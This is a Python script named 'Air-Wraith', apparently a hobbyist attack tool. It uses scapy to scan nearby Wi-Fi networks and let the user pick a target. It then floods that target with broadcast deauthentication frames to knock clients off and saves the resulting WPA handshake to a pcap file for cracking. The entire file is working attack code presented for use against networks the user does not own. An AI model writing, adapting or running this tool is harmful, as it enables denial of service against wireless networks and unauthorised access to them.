import os
import sys
import threading
from scapy.all import *
from rich.console import Console
from rich.table import Table
from rich.live import Live

console = Console()

class AirWraithElite:
    def __init__(self, interface):
        self.interface = interface
        self.networks = {} # BSSID: (SSID, CH, Signal)
        self.clients = set() # Targeted clients
        self.handshake_captured = False
        self.target_bssid = None
        self.target_ch = None

    def banner(self):
        console.print("""[bold red]
      ▄▄▄       ██▓ ██▀███   █     █░ ██▓▄▄▄       ██▓ █████   ██░ ██ 
     ▒████▄    ▓██▒▓██ ▒ ██▒▓█    █  ▓██▒████▄    ▓██▒██▒  ██▒▓██░ ██▒
     ▒██  ▀█▄  ▒██▒▓██ ░▄█ ▒▒█    █ ░▒██▒██  ▀█▄  ▒██▒██░  ██▒▒██▀▀██░
     ░██▄▄▄▄██ ░██░▒██▀▀█▄  ░█    █ ▒░██░██▄▄▄▄██ ░██░██   ██░░▓█ ░██ 
      ▓█   ▓██▒░██░░██▓ ▒██▒ ░████ ░ ░██░▓█   ▓██▒░██░ ████▓▒░░▓█▒░██▓
      ▒▒   ▓▒█░░▓  ░ ▒▓ ░▒▓░ ░ ▐░   ░▓  ▒▒   ▓▒█░░▓  ░ ▒░▒░▒░  ▒ ░░▒░▒
                                 [ by n0merc]
        [/bold red][bold white]>> AUTOMATED HANDSHAKE SNATCHER & DEAUTH FLOODER <<[/bold white]
        """)

    def packet_handler(self, pkt):
        # 1. Discover Networks (Beacons)
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            try:
                ssid = pkt[Dot11Elt].info.decode()
            except:
                ssid = "<Hidden SSID>"
            stats = pkt[Dot11Beacon].network_stats()
            ch = stats.get("channel")
            sig = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else "N/A"
            if bssid not in self.networks:
                self.networks[bssid] = (ssid, ch, sig)

        # 2. Capture Handshake (EAPOL frames)
        if pkt.haslayer(EAPOL) and self.target_bssid:
            if pkt[Dot11].addr3 == self.target_bssid:
                if not self.handshake_captured:
                    console.print(f"\n[bold green][!] GOTHAM! Handshake captured for {self.target_bssid}![/bold green]")
                    wrpcap(f"handshake_{self.target_bssid.replace(':','')}.pcap", pkt, append=True)
                    self.handshake_captured = True

    def hop_channel(self, ch=None):
        if ch:
            os.system(f"iwconfig {self.interface} channel {ch}")
        else:
            curr = 1
            while True:
                os.system(f"iwconfig {self.interface} channel {curr}")
                curr = curr % 13 + 1
                time.sleep(0.5)

    def launch_attack(self, bssid, ch):
        self.target_bssid = bssid
        self.target_ch = ch
        self.hop_channel(ch)
        
        console.print(f"[*] Locking on Channel {ch}. Flooding Deauth...", style="bold red")
        
        # Deauth frame to broadcast (FF:FF:FF:FF:FF:FF)
        deauth_pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
        
        # Attack and Sniff simultaneously
        def flood():
            while not self.handshake_captured:
                sendp(deauth_pkt, iface=self.interface, count=10, verbose=False)
                time.sleep(0.1)

        threading.Thread(target=flood, daemon=True).start()
        sniff(iface=self.interface, prn=self.packet_handler, timeout=60)

# --- Execution ---
if __name__ == "__main__":
    if os.getuid() != 0:
        print("Run as root (sudo)!")
        sys.exit()

    wraith = AirWraithElite(sys.argv[1])
    wraith.banner()
    
    # Simple Scan first
    console.print("[*] Initializing reconnaissance scan (15s)...", style="cyan")
    sniff(iface=wraith.interface, prn=wraith.packet_handler, timeout=15)
    
    # Show Results
    table = Table(title="Air-Wraith Targets")
    table.add_column("SSID")
    table.add_column("BSSID")
    table.add_column("CH")
    for bssid, info in wraith.networks.items():
        table.add_row(info[0], bssid, str(info[1]))
    console.print(table)

    target = console.input("\n[bold red]Enter BSSID to annihilate: [/bold red]")
    ch = wraith.networks[target][1]
    
    wraith.launch_attack(target, ch)